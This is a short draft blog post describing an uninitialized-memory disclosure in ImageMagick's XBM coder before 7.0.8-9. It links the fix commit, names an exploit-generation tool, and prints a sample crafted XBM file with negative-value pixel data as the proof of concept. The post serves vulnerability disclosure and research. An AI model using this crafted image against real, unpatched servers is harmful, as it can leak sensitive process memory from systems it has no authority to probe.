---
title: "Data Processing Libraries. Part I"
date: 2020-02-24T10:51:03+01:00
draft: true
---

# ImageMagick memory leak at XBM coder

ReadXBMImage in coders/xbm.c in ImageMagick before 7.0.8-9 (https://github.com/ImageMagick/ImageMagick/commit/216d117f05bff87b9dc4db55a1b1fadb38bcb786) leaves data uninitialized when processing an XBM file that has a negative pixel value. 
If the affected code is used as a library loaded into a process that includes sensitive information, that information sometimes can be leaked via the image data. 
Exploit for ImageMagick's uninitialized memory disclosure in xbm coder.  
Auto-generation tool is [xbmdump](https://github.com/d0ge/xbmdump)

### Sample image

```
#define -_width 16
#define -_height 16
static char -_bits[] = {
  0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, };
```

### Severity: Medium - High
Severity level depends on the web server environment.
